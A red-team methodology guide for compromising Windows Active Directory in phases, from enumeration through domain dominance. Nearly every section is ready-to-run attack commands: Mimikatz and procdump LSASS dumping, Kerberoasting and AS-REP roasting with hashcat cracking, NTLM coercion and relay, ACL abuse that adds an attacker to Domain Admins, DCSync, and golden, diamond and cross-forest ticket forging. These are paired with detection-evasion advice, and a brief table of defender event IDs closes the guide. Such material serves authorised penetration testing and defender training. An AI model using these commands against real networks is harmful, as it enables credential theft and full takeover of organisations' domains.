# AD Attack Path Methodology

> **MITRE ATT&CK**: Multiple tactics (Discovery, Credential Access, Privilege Escalation, Lateral Movement)
> **Platforms**: Windows
> **Required Privileges**: Varies (Domain User to Domain Admin)
> **OPSEC Risk**: Varies by phase

## Strategic Overview

A Red Team Lead must internalize a structured methodology for AD compromise. Random tool
execution gets caught. A disciplined, phased approach -- moving from situational awareness
through enumeration, credential harvesting, privilege escalation, and finally domain
dominance -- maximizes success probability while minimizing detection surface. Each phase
builds on the previous, and the Lead must know when to pause, reassess, and pivot.

---

## Phase 1: Situational Awareness

**Goal**: Understand where you are, what domain you are in, and the broad environment shape.
**OPSEC**: Low risk -- these are normal user operations.

### Native Windows Commands
```cmd
whoami /all                          # Current user, groups, privileges, SID
hostname                             # Current hostname
systeminfo                           # OS version, domain, DC, hotfixes
ipconfig /all                        # Network config, DNS servers (often DCs)
net user %username% /domain          # Current user details from DC
net group "Domain Admins" /domain    # Members of Domain Admins
net group "Enterprise Admins" /domain
nltest /dclist:domain.local          # List all domain controllers
nltest /domain_trusts                # List all domain trusts
```

### PowerView Situational Awareness
```powershell
Import-Module .\PowerView.ps1

Get-Domain                           # Current domain info
Get-DomainController                 # All DCs with IPs and OS versions
Get-Forest                           # Forest name, domains, global catalogs
Get-ForestDomain                     # All domains in the forest
Get-DomainTrust                      # All trusts with type and direction
Get-DomainPolicy                     # Password policy, Kerberos policy
(Get-DomainPolicy).SystemAccess      # Minimum password length, lockout threshold
(Get-DomainPolicy).KerberosPolicy    # Max ticket age, max clock skew
```

### AD PowerShell Module (Stealthier)
```powershell
# Import without RSAT (use the DLL directly)
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1

Get-ADDomain                         # Domain details
Get-ADForest                         # Forest details
Get-ADTrust -Filter *                # All trusts
Get-ADDomainController -Filter *     # All DCs
```

### Key Intel to Gather
- Domain functional level (2008 R2? 2016? Affects attack surface)
- Number of DCs and their OS versions
- Trust relationships and types (forest vs external, direction)
- Password policy (lockout threshold for spray attacks)
- Kerberos policy (max ticket lifetime for ticket forging)

---

## Phase 2: Enumeration

**Goal**: Map attack paths, identify high-value targets, find misconfigurations.
**OPSEC**: Medium risk -- heavy LDAP queries may trigger monitoring.

### BloodHound Collection

```powershell
# SharpHound (C# collector) - choose collection method based on OPSEC
# All data (noisy but complete)
.\SharpHound.exe -c All --zipfilename output.zip

# Stealth mode (no local admin checks, no session enumeration)
.\SharpHound.exe -c DCOnly --zipfilename output.zip

# Session collection only (useful for finding where admins are logged in)
.\SharpHound.exe -c Session --zipfilename output.zip

# Specific domain / DC targeting
.\SharpHound.exe -c All -d child.domain.local --domaincontroller dc02.child.domain.local
```

```bash
# BloodHound.py (from Linux, uses LDAP/RPC)
bloodhound-python -u user -p 'password' -d domain.local -ns DC_IP -c All
bloodhound-python -u user -p 'password' -d domain.local -c DCOnly  # Stealth
```

### BloodHound Cypher Queries

```cypher
// Shortest path from owned principals to Domain Admins
MATCH p=shortestPath((n {owned:true})-[r*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE n <> m RETURN p

// Find all Kerberoastable users with paths to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[r*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, length(p) ORDER BY length(p) ASC

// Find AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.description

// Unconstrained delegation computers (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC" RETURN c.name

// Users with DCSync rights
MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain)
WHERE NOT n.name STARTS WITH "DOMAIN CONTROLLERS"
RETURN n.name, labels(n)

// Find GPO abuse paths
MATCH p=(g:GPO)-[r:GpLink]->(ou:OU)
MATCH (u:User)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g)
RETURN u.name, g.name, ou.name

// Computers where Domain Users can RDP
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer)
RETURN c.name
```

### ACL Enumeration
```powershell
# Find interesting ACLs on the domain object
Find-InterestingDomainAcl -ResolveGUIDs |
    ?{$_.IdentityReferenceName -notmatch "Admin|SYSTEM|Creator"}

# Who can DCSync?
Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs |
    ?{$_.ObjectAceType -match "Replication-Get-Changes"} |
    select SecurityIdentifier, ObjectAceType

# ACLs on specific user
Get-DomainObjectAcl -Identity "high_value_user" -ResolveGUIDs

# Find users with GenericAll on other users
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
    ?{$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21"}
```

### Certificate Services Enumeration
```powershell
# Certify.exe - find all vulnerable templates
.\Certify.exe find /vulnerable

# Certify.exe - enumerate CAs
.\Certify.exe cas
```
```bash
# Certipy from Linux
certipy find -u user -p 'password' -dc-ip DC_IP -vulnerable -stdout
certipy find -u user -p 'password' -dc-ip DC_IP -json  # Full output
```

### Delegation Enumeration
```powershell
# Unconstrained delegation
Get-DomainComputer -Unconstrained | select dnshostname
Get-DomainUser -TrustedToAuth | select samaccountname  # Unusual but exists

# Constrained delegation
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Resource-Based Constrained Delegation (who has write to computer objects?)
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs |
    ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl"}
```

---

## Phase 3: Credential Harvesting

**Goal**: Obtain credentials to move laterally and escalate.
**OPSEC**: Medium-High risk -- credential access is heavily monitored.

### Kerberoasting (High-Value SPNs Only)
```powershell
# Check stats first to identify high-value targets
.\Rubeus.exe kerberoast /stats

# Target specific accounts (stealthier than requesting all SPNs)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:tgs.txt /format:hashcat

# Use AES to avoid RC4 downgrade detection
.\Rubeus.exe kerberoast /user:svc_sql /enctype:aes /outfile:tgs_aes.txt
```
```bash
# From Linux
GetUserSPNs.py domain.local/user:pass -request -outputfile tgs.txt -dc-ip DC_IP
hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule
```

### AS-REP Roasting
```bash
# Enumerate and roast
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

### LSASS Credential Dumping
```powershell
# Mimikatz (in-memory)
privilege::debug
sekurlsa::logonpasswords       # All cached credentials
sekurlsa::ekeys                # Kerberos keys (AES256, AES128, RC4)

# Procdump (signed Microsoft binary, less suspicious)
procdump.exe -ma lsass.exe lsass.dmp
# Then offline: sekurlsa::minidump lsass.dmp

# Nanodump (direct syscalls, EDR evasion)
nanodump.exe --write C:\temp\debug.dmp
```

### DPAPI Credential Recovery
```powershell
# SharpDPAPI - triage all accessible DPAPI secrets
.\SharpDPAPI.exe triage

# Target Chrome passwords, RDP saved credentials, Credential Manager
.\SharpDPAPI.exe credentials /target:C:\Users\victim\AppData\
```

### NTLM Coercion
```bash
# PetitPotam (unauthenticated on unpatched DCs)
PetitPotam.py attacker_listener_ip dc01_ip

# PrinterBug / SpoolSample
SpoolSample.exe dc01.domain.local attacker-host.domain.local

# Capture with Responder or relay with ntlmrelayx
responder -I eth0 -wFb
ntlmrelayx.py -t smb://target -smb2support
```

---

## Phase 4: Privilege Escalation

**Goal**: Elevate from standard user to domain admin or equivalent.
**OPSEC**: High risk -- privilege escalation actions are high-fidelity alerts.

### ACL Abuse Chains
```powershell
# Example: User has WriteDacl on Domain Admins group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# Example: GenericWrite on user -> Targeted Kerberoasting
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}
.\Rubeus.exe kerberoast /user:target_user /outfile:tgs.txt
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

### ADCS Exploitation (see adcs-attacks.md for full detail)
```bash
# ESC1: Request cert as domain admin
certipy req -u user -p pass -ca CA -template VulnTemplate -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### Delegation Abuse
```powershell
# RBCD: Write to target computer -> impersonate admin
# See kerberos-attacks-deep-dive.md for full commands
```

---

## Phase 5: Domain Dominance

**Goal**: Establish full domain/forest control and deploy persistence.
**OPSEC**: Highest risk -- these are the actions most likely to trigger incident response.

### DCSync
```powershell
# Mimikatz DCSync (requires Replicating Directory Changes rights)
lsadump::dcsync /domain:domain.local /user:administrator
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv    # Everything

# Impacket
secretsdump.py domain.local/admin:pass@dc01.domain.local -just-dc-ntlm
secretsdump.py -hashes :NTLM_HASH domain.local/admin@dc01 -just-dc-user krbtgt
```

### Ticket Forging (see ad-persistence-deep-dive.md)
```powershell
# Golden Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Diamond Ticket (preferred for OPSEC)
.\Rubeus.exe diamond /krbkey:AES256_KEY /ticketuser:administrator /domain:domain.local /dc:dc01
```

### Cross-Forest Exploitation
```powershell
# If inter-forest trust exists, enumerate the other forest
Get-DomainTrust -Domain partner.local
Get-DomainUser -Domain partner.local

# Forge inter-realm TGT with SID History (only works if SID filtering is weak)
kerberos::golden /user:attacker /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH /sids:PARTNER_EA_SID /ptt

# ExtraSids attack for child-to-parent domain escalation (within same forest)
kerberos::golden /user:administrator /domain:child.domain.local /sid:CHILD_SID /krbtgt:CHILD_KRBTGT /sids:S-1-5-21-PARENT-519 /ptt
```

---

## Detection & Evasion

### How Defenders Detect This
| Phase | Detection Method |
|-------|-----------------|
| Situational Awareness | Generally not detected (normal user operations) |
| Enumeration | LDAP query volume, BloodHound signatures, honeypot accounts |
| Credential Harvesting | Event 4769 (Kerberoasting), LSASS access (Sysmon 10), coercion traffic |
| Privilege Escalation | ACL changes (Event 5136), group membership changes (Event 4728/4756) |
| Domain Dominance | DCSync (Event 4662 with replication GUIDs), ticket anomalies |

### Evasion Techniques
- **Enumeration**: Use DCOnly collection, query specific objects instead of sweeping
- **Credential harvesting**: Target specific high-value SPNs, use AES encryption
- **Lateral movement**: Use existing admin sessions, avoid creating new ones
- **Privilege escalation**: Chain low-noise ACL abuses rather than direct group additions
- **Domain dominance**: Diamond Ticket over Golden Ticket, avoid mass DCSync

---

## Cross-References

- [Kerberos Attacks Deep Dive](./kerberos-attacks-deep-dive.md) -- Phase 3-4 detail
- [ADCS Attacks](./adcs-attacks.md) -- Phase 4 privilege escalation via certificates
- [AD Persistence](./ad-persistence-deep-dive.md) -- Phase 5 post-dominance
- [AD Fundamentals](./ad-fundamentals.md) -- Protocol knowledge underlying all phases

---

## References

- [Hausec: AD Attack Cheat Sheet](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
- [The Hacker Recipes](https://www.thehacker.recipes/ad/movement)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [harmj0y: Roasting AS-REPs](https://harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [SpecterOps: BloodHound Custom Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
